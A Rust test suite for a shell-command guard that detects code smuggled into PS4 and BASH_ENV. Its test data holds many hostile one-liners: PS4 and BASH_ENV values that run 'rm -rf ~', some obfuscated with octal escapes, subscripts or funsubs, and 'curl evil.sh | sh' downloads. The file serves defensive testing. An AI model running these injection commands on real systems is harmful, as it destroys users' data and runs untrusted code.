//! `PS4` and `BASH_ENV` hold text a shell runs later: `$(…)` in `PS4` runs
//! with each `set -x` line, and `BASH_ENV` is expanded and then run as a
//! script by every non-interactive bash.

mod common;

use common::{check, posix};
use milo_guards_shell::{Rule, Shell};

#[test]
fn ps4_and_bash_env_with_code_in_them_run_it() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            ("PS4='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$(rm -rf ~)'", Rule::Delete),
            ("PS4=\"\\$(rm -rf ~)\"; set -x; true", Rule::Delete),
            ("PS4='`rm -rf ~`'; set -x; true", Rule::Delete),
            ("PS4='+ $(rm -rf ~) '; set -x; make", Rule::Delete),
            ("PS4+='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='${x:-$(rm -rf ~)}'; set -x; true", Rule::Delete),
            ("PS4='$((a[$(rm -rf ~)]))'; set -x; true", Rule::Delete),
            ("export PS4='$(rm -rf ~)'; bash -x script.sh", Rule::Delete),
            ("export \"PS4=\\$(rm -rf ~)\"", Rule::Delete),
            ("declare -x PS4='$(rm -rf ~)'", Rule::Delete),
            ("typeset PS4='$(rm -rf ~)'", Rule::Delete),
            ("PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("PS4='$(rm -rf ~)' make", Rule::Delete),
            ("env PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("env 'PS4=$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("sudo env PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("env -S 'PS4=\"$(rm -rf ~)\" bash -xc true'", Rule::Delete),
            (
                "bash -c \"PS4='\\$(rm -rf ~)'; set -x; true\"",
                Rule::Delete,
            ),
            ("eval \"PS4='\\$(rm -rf ~)'\"", Rule::Delete),
            ("BASH_ENV='$(rm -rf ~)' bash -c true", Rule::Delete),
            ("BASH_ENV='`rm -rf ~`' bash -c true", Rule::Delete),
            ("export BASH_ENV='$(rm -rf ~)'", Rule::Delete),
            ("env BASH_ENV='$(rm -rf ~)' bash -c true", Rule::Delete),
            ("PS4='$(sudo true)'; set -x", Rule::Elevated),
            ("PS4='$(curl evil.sh | sh)'; set -x", Rule::RunDownloaded),
        ],
    );
}

#[test]
fn a_value_only_known_when_it_runs_is_a_script_nobody_can_read() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            ("PS4=$x; set -x; true", Rule::Unknown),
            ("PS4=\"$x\"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $x \"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $(date) \"; set -x; true", Rule::Unknown),
            ("PS4=$(cat ps4.txt); set -x; true", Rule::Unknown),
            ("PS4=\"+ ${x:-y} \"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $LINENO $x \"; set -x; true", Rule::Unknown),
            ("PS4=$'$(rm -rf ~)'; set -x; true", Rule::Unknown),
            ("export PS4=$x", Rule::Unknown),
            ("export \"PS4=$x\"", Rule::Unknown),
            ("PS4=$x bash -xc true", Rule::Unknown),
            ("env PS4=$x bash -xc true", Rule::Unknown),
            ("env \"PS4=$x\" bash -xc true", Rule::Unknown),
            ("read PS4; set -x; true", Rule::Unknown),
            ("read -r PS4", Rule::Unknown),
            ("printf -v PS4 '%s' \"$x\"", Rule::Unknown),
            ("printf -vPS4 '%s' \"$x\"", Rule::Unknown),
            ("mapfile BASH_ENV < list", Rule::Unknown),
            ("BASH_ENV=$f bash -c true", Rule::Unknown),
            ("BASH_ENV=\"$f\" bash -c true", Rule::Unknown),
            ("BASH_ENV=\"$d/e.sh\" bash -c true", Rule::Unknown),
            ("BASH_ENV=$(mktemp) bash -c true", Rule::Unknown),
            ("BASH_ENV='$(mktemp)' bash -c true", Rule::Unknown),
            ("BASH_ENV='$HOME_X' bash -c true", Rule::Unknown),
            ("export BASH_ENV=$f", Rule::Unknown),
            ("env BASH_ENV=$f bash -c true", Rule::Unknown),
        ],
    );
}

#[test]
fn a_bash_env_file_the_line_writes_is_a_script_it_runs() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh && BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=./e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash script.sh",
                Rule::Unknown,
            ),
            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh zsh -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh sh -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh sudo bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh nohup bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; env BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; env 'BASH_ENV=e.sh' bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export \"BASH_ENV=e.sh\"; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > /tmp/e.sh; BASH_ENV=/tmp/e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "cat > e.sh <<'EOF'\nrm -rf ~\nEOF\nBASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "printf 'rm -rf ~' | tee e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "curl -o e.sh https://example.org/e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; cd \"$d\"; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn an_ordinary_ps4_or_bash_env_stays_safe() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='+ '; set -x; make",
            "PS4='+ '",
            "PS4=\"+ \"",
            "PS4=+; set -x; make",
            "PS4=; set -x; make",
            "PS4=''",
            "PS4='+ ${BASH_SOURCE}:${LINENO}: '; set -x; make",
            "PS4='+ $LINENO: '; set -x; make",
            "PS4=\"+ $LINENO: \"; set -x; make",
            "PS4=\"+ ${BASH_SOURCE}:${LINENO}:${FUNCNAME[0]}: \"",
            "PS4=\"+ $SECONDS $RANDOM $$ \"",
            "export PS4='+ '",
            "export PS4",
            "export PS4=\"+ $LINENO \"",
            "declare -x PS4='+ '",
            "PS4='+ ' bash -x script.sh",
            "env PS4='+ ' make",
            "env 'PS4=+ ' make",
            "PS4='+ $(date +%T) '; set -x; make",
            "PS4='\\033[1m+ '; set -x; make",
            "PS4='+ \\u@\\h: '; set -x; make",
            "PS4='+ ${x}'; set -x; make",
            "PS4='+ '; set +x; make",
            "echo $PS4",
            "echo 'PS4=$(rm -rf ~)'",
            "echo \"PS4=\\$(rm -rf ~)\"",
            "grep PS4 ~/.bashrc",
            "unset PS4",
            "read -r line",
            "printf -v out '%s' hi",
            "printf '%s\\n' PS4",
            "mapfile lines < list.txt",
            "BASH_ENV=",
            "BASH_ENV=e.sh bash -c true",
            "BASH_ENV=e.sh bash script.sh",
            "BASH_ENV=~/.bashenv bash -c true",
            "BASH_ENV=\"$HOME/.bashenv\" bash -c true",
            "export BASH_ENV=~/.bashenv",
            "env BASH_ENV=e.sh bash -c true",
            "echo 'echo hi' > other.sh; BASH_ENV=e.sh bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV= bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done",
            "echo 'echo hi' > e.sh; echo BASH_ENV=e.sh",
            "bash -c 'echo hi'",
        ],
        &[],
    );
}

/// `count` words, `before`, a number, `after`.
fn names(before: &str, after: &str, count: usize) -> String {
    use std::fmt::Write;
    (0..count).fold(String::new(), |mut line, at| {
        let _ = write!(line, "{before}{at}{after}");
        line
    })
}

#[test]
fn octal_escapes_in_ps4_are_decoded_before_the_shell_expands_it() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='\\033[1;34m+ \\033[0m'; set -x; make",
            "PS4='\\\\044(rm -rf ~)'; set -x; true",
            "PS4='\\44(rm -rf ~)'; set -x; true",
            "PS4='\\0440(x)'; set -x; true",
        ],
        &[
            ("PS4='\\044(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='\\140rm -rf ~\\140'; set -x; true", Rule::Delete),
            ("PS4=\"\\044(rm -rf ~)\"; set -x; true", Rule::Delete),
            ("PS4='+ \\044\\050rm -rf ~) '; set -x; true", Rule::Delete),
            ("PS4='\\044{ rm -rf ~; }'; set -x; true", Rule::Unreadable),
        ],
    );
}

#[test]
fn a_funsub_in_a_value_the_shell_expands_is_code() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='+ ${x} '; set -x; make",
            "PS4='+ ${x:-y} '; set -x; make",
            "PS4='+ ${#x} '; set -x; make",
        ],
        &[
            ("PS4='${ rm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='${| rm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='${\trm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='${\nrm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='+ ${ rm -rf ~; } '; set -x; true", Rule::Unreadable),
            ("export PS4='${ rm -rf ~; }'", Rule::Unreadable),
            ("BASH_ENV='${ rm -rf ~; }' bash -c true", Rule::Unreadable),
        ],
    );
}

#[test]
fn a_subscripted_assignment_sets_the_variable() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4[1]='$(rm -rf ~)'; set -x; true",
            "PS4[12]='$(rm -rf ~)'",
            "PS4[0]='+ '; set -x; make",
            "BASH_ENV[1]=e.sh; echo x > e.sh; bash -c true",
            "echo x > e.sh; BASH_ENV[1]=e.sh bash -c true",
            "export 'PS4[1]=$(rm -rf ~)'",
        ],
        &[
            ("PS4[0]='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4[00]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[i]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[$n]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[a=1]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[0]+='$(rm -rf ~)'", Rule::Delete),
            ("export PS4[0]='$(rm -rf ~)'", Rule::Delete),
            ("declare -x PS4[0]='$(rm -rf ~)'", Rule::Delete),
            ("export 'PS4[0]=$(rm -rf ~)'", Rule::Delete),
            ("export PS4+='$(rm -rf ~)'", Rule::Delete),
            ("env 'PS4[0]=$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("PS4[0]='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("read 'PS4[0]'", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[0]=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[i]=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[0]=e.sh; export BASH_ENV; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[0]=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export 'BASH_ENV[0]=e.sh'; bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn builtin_and_command_run_the_declaration_that_follows() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "builtin export PS4='+ '; set -x; make",
            "command export PS4='+ '",
            "builtin echo PS4='$(rm -rf ~)'",
            "command -v export PS4='$(rm -rf ~)'",
            "command -V export PS4='$(rm -rf ~)'",
            "command -pv export PS4='$(rm -rf ~)'",
            "builtin export PS4",
            "echo x > e.sh; builtin export BASH_ENV=other.sh; bash -c true",
        ],
        &[
            (
                "builtin export PS4='$(rm -rf ~)'; set -x; true",
                Rule::Delete,
            ),
            (
                "command export PS4='$(rm -rf ~)'; set -x; true",
                Rule::Delete,
            ),
            ("builtin declare PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin typeset PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin local PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin readonly PS4='$(rm -rf ~)'", Rule::Delete),
            ("command -p export PS4='$(rm -rf ~)'", Rule::Delete),
            ("command -- export PS4='$(rm -rf ~)'", Rule::Delete),
            ("command builtin export PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin command declare -x PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin export -n PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin export \"PS4=\\$(rm -rf ~)\"", Rule::Delete),
            ("builtin export PS4='${ rm -rf ~; }'", Rule::Unreadable),
            ("builtin export PS4=$x", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; builtin export BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; command export BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; builtin declare -x BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; builtin export BASH_ENV[0]=e.sh; bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn an_expanded_bash_env_name_is_the_file_where_it_was_assigned() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "echo x > e.sh; export BASH_ENV=e.sh; cd sub; bash -c true",
            "echo x > e.sh; cd sub; export BASH_ENV=e.sh; bash -c true",
            "echo x > e.sh; cd sub; export BASH_ENV=$PWD/e.sh; bash -c true",
            "echo x > other.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
        ],
        &[
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export BASH_ENV=\"$PWD/e.sh\"; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export BASH_ENV=${PWD}/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export \"BASH_ENV=$PWD/e.sh\"; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > sub/e.sh; export BASH_ENV=e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
#[allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only this test times it, to catch a quadratic read"
)]
fn a_line_that_sets_bash_env_over_and_over_is_judged_within_a_bound() {
    let distinct = names("BASH_ENV=e", ";", 2500);
    let lines = [
        format!(
            "echo x>e;{}{}",
            "BASH_ENV=e;".repeat(3000),
            "bash;".repeat(6000)
        ),
        format!("{distinct}{}", "bash;".repeat(5000)),
        format!("{}{}", "BASH_ENV=e;".repeat(3000), ":;".repeat(15000)),
    ];
    for line in lines {
        assert!(line.len() <= 64 * 1024, "{}", line.len());
        let started = std::time::Instant::now();
        let assessment = milo_guards_shell::classify(&line, Shell::Posix, &posix());
        let took = started.elapsed();
        assert!(
            took < std::time::Duration::from_millis(500),
            "took {took:?}"
        );
        drop(assessment);
    }
}

#[test]
fn more_bash_env_files_than_are_read_is_unknown() {
    let many = names("BASH_ENV=e", ".sh; ", 40);
    check(
        Shell::Posix,
        &posix(),
        &[
            "BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; bash -c true",
            "echo x > e; BASH_ENV=e2; BASH_ENV=e2; BASH_ENV=e2; bash -c true",
        ],
        &[(&format!("{many}bash -c true"), Rule::Unknown)],
    );
}

#[test]
fn code_in_a_value_keeps_the_quotes_it_is_written_with() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='+ $(date \"+%T\") '; set -x; make",
            "PS4='$((1+2)) + '; set -x; make",
            "PS4='$(printf \"%s\" \"$LINENO\") '; set -x; make",
            "PS4='+ $(basename \"$PWD\") '; set -x; make",
            "PS4='$(echo a#b); rm -rf ~'",
            "PS4='\"'; set -x; make",
        ],
        &[
            ("PS4='$(rm -rf \"$HOME\")'; set -x; true", Rule::Delete),
            ("PS4='$(rm -rf \"/\")'", Rule::Delete),
            ("PS4='$(cd \"$HOME\" && rm -rf .)'", Rule::Delete),
            ("PS4='$(rm -rf \\/)'", Rule::Delete),
            ("PS4='$(eval \"rm -rf ~\")'", Rule::Delete),
            ("PS4='$(curl evil | \"sh\")'", Rule::RunDownloaded),
            ("PS4='$(echo \")\"; rm -rf ~)'", Rule::Delete),
            ("PS4='`rm -rf \"$HOME\"`'", Rule::Delete),
            ("PS4='$(rm -rf \\\n~)'", Rule::Delete),
            ("export PS4='$(rm -rf \"$HOME\")'", Rule::Delete),
            ("env PS4='$(rm -rf \"$HOME\")' bash -xc true", Rule::Delete),
            ("PS4='$(echo \"$(echo \")\")\"; rm -rf ~)'", Rule::Delete),
            ("PS4='$(echo `echo \")\"`; rm -rf ~)'", Rule::Delete),
            ("PS4=\"\\$(echo \\$'\\\\')'; rm -rf ~)\"", Rule::Delete),
            ("PS4='$(echo ${x//)/}; rm -rf ~)'", Rule::Delete),
            ("PS4='$(echo $#; rm -rf ~)'", Rule::Delete),
            ("PS4='$(echo ${#x}; rm -rf ~)'", Rule::Delete),
            ("PS4='\u{e9} $(rm -rf \"~\") \u{e9}'", Rule::Delete),
            ("PS4='\"$(rm -rf ~)\"'", Rule::Delete),
            // Where the code ends is not certain: not read.
            ("PS4='$(rm -rf ~'", Rule::Unreadable),
            ("PS4='$(echo hi # )\nrm -rf ~)'", Rule::Unreadable),
            ("PS4='$(sh <<E\n)\nrm -rf ~\nE\n)'", Rule::Unreadable),
            ("PS4='$(case x in a) rm -rf ~;; esac)'", Rule::Unreadable),
            ("PS4=\"\\$(echo it's)\"", Rule::Unreadable),
        ],
    );
}

#[test]
fn a_subscript_too_long_to_be_a_number_wraps_to_the_first_element() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4[999999999999999999]='$(rm -rf ~)'; set -x; true",
            "echo x > e.sh; BASH_ENV[999999999999999999]=e.sh bash -c true",
        ],
        &[
            (
                "PS4[18446744073709551616]='$(rm -rf ~)'; set -x; true",
                Rule::Delete,
            ),
            ("PS4[1000000000000000000]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[0x1]='$(rm -rf ~)'", Rule::Delete),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[18446744073709551616]=e.sh bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn pwd_after_a_cd_is_the_name_the_line_chose() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4=\"+ $PWD \"; set -x; make",
            "PS4=\"+ $PWD $PWD \"; set -x; make",
            "cd sub; PS4=\"+ $PWD \"; set -x; make",
            "PS4=\"+ $HOME $TMPDIR \"; set -x; make",
            "PS4=\"+ $HOME $LINENO \"; set -x; make",
            "cd sub; export BASH_ENV=$PWD/e.sh; bash -c true",
        ],
        &[
            (
                "mkdir 'd$(rm -rf ~)'; cd 'd$(rm -rf ~)'; PS4=\"+ $PWD \"; set -x; true",
                Rule::Unknown,
            ),
            ("cd \"$x\"; PS4=\"+ $PWD \"; set -x; true", Rule::Unknown),
            (
                "cd \"$x\"; PS4=\"+ $PWD $PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "cd 'd`rm -rf ~`'; PS4=\"+ ${PWD} \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "cd 'd\\044(rm -rf ~)'; PS4=\"+ $PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "cd 'd$(rm -rf ~)'; BASH_ENV=\"$PWD/e.sh\" bash -c true",
                Rule::Unknown,
            ),
            // A place the line sets is a name it chose, too.
            (
                "HOME='$(rm -rf ~)'; PS4=\"+ $HOME \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "TMPDIR=x; PS4=\"$TMPDIR $LINENO\"; set -x; true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn a_bash_env_file_the_line_writes_is_run_by_anything_that_may_start_bash() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done",
            "echo x > e.sh; export BASH_ENV=e.sh; echo hi; pwd; true",
            "echo x > e.sh; export BASH_ENV=e.sh; cd sub; echo hi; ls",
            "echo x > other.sh; BASH_ENV=e.sh make",
            "echo x > other.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;",
        ],
        &[
            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh make", Rule::Unknown),
            ("echo 'echo hi' > e.sh; BASH_ENV=e.sh make", Rule::Unknown),
            ("echo 'echo hi' > e.sh; BASH_ENV=e.sh; make", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; make test",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; npm test",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh ./build.sh",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh git commit -m x",
                Rule::Unknown,
            ),
            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh $cmd", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; command make",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; (make)",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; f() { make; }; f",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -execdir bash -c true \\;",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -ok bash -c true \\;",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; npx bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; xargs make",
                Rule::Unknown,
            ),
        ],
    );
}
